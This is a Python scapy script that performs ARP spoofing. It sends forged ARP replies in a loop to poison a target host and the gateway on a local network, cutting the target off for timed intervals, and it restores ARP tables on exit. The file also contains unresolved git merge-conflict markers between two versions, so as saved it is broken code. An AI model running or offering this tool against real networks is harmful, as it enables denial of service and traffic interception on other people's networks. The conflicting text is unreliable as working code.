# !/usr/bin/env python3
# -*- coding: utf-8 -*-
from scapy.all import *
import sys
import time

<<<<<<< HEAD

def build_arp(target_ip, target_mac, gateway_ip, gateway_mac):
    """ 构造arp包，返回2个毒包，2个恢复包
=======
def build_arp(target_ip, target_mac, gateway_ip, gateway_mac):
    """ 
>>>>>>> 2a58a734f0c58638bfb7778189ed6f559fa6a565
    op         : ShortEnumField                      = (1)
    hwsrc      : ARPSourceMACField                   = (None)
    psrc       : SourceIPField                       = (None)
    hwdst      : MACField                            = ('00:00:00:00:00:00')
    pdst       : IPField                             = ('0.0.0.0')
    """
    target_arp = ARP(op=2, psrc=gateway_ip, hwdst=target_mac, pdst=target_ip)
    gateway_arp = ARP(op=2, psrc=target_ip, hwdst=gateway_mac, pdst=gateway_ip)
    r_target_arp = ARP(op=2, hwsrc=gateway_mac, psrc=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip)
    r_gateway_arp = ARP(op=2, hwsrc=target_mac, psrc=target_ip, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip)
    return target_arp, gateway_arp, r_target_arp, r_gateway_arp

<<<<<<< HEAD

def send_arp(target_arp, gateway_arp):
    """ 发包
    """
=======
def send_arp(target_arp, gateway_arp):
>>>>>>> 2a58a734f0c58638bfb7778189ed6f559fa6a565
    send(target_arp)
    send(gateway_arp)

def main():
<<<<<<< HEAD
    a = 10 # 断网时间
    r = 1 # 连通时间
    
    interface = 'eth0'
    
    gateway_ip = '192.168.1.1'
    target_ip = '192.168.1.103' #IP地址啥的就手动填进来吧
=======
    a = 10
    r = 1
    interface = 'eth0'
    
    gateway_ip = '192.168.1.1'
    target_ip = '192.168.1.103'
>>>>>>> 2a58a734f0c58638bfb7778189ed6f559fa6a565
    try:
        gateway_mac = getmacbyip(gateway_ip)
        target_mac = getmacbyip(target_ip)
    except PermissionError:
        print("Please use root user to run!!!")
        sys.exit(0)
    conf.iface = interface
    conf.verb = 0
    print("[*] Interface: %s"%interface)
    
    if gateway_mac is None:
        print("[!] ERROR: can't get gateway mac.")
        sys.exit(0)
    else:
        print("[*] Gateway IP: %s mac: %s."%(gateway_ip, gateway_mac))

    if target_mac is None:
        print("[!] ERROR: can't get target mac.")
        sys.exit(0)
    else:
        print("[*] Target IP: %s mac: %s."%(target_ip, target_mac))
    
    target_arp, gateway_arp, r_target_arp, r_gateway_arp = build_arp(target_ip, target_mac, gateway_ip, gateway_mac)
    while True:
        try:
            send_arp(target_arp, gateway_arp)
            print("[*] Attacking!")
            time.sleep(10)
            send_arp(r_target_arp, r_gateway_arp)
            print("[*] Recovering!")
            time.sleep(r)
        except KeyboardInterrupt:
            break
<<<<<<< HEAD
    send_arp(r_target_arp, r_gateway_arp) # 搞破坏后当然要恢复一下
=======
    send_arp(r_target_arp, r_gateway_arp)
>>>>>>> 2a58a734f0c58638bfb7778189ed6f559fa6a565
    print("\n[*] ARP has been restored.")

if __name__ == '__main__':
    main()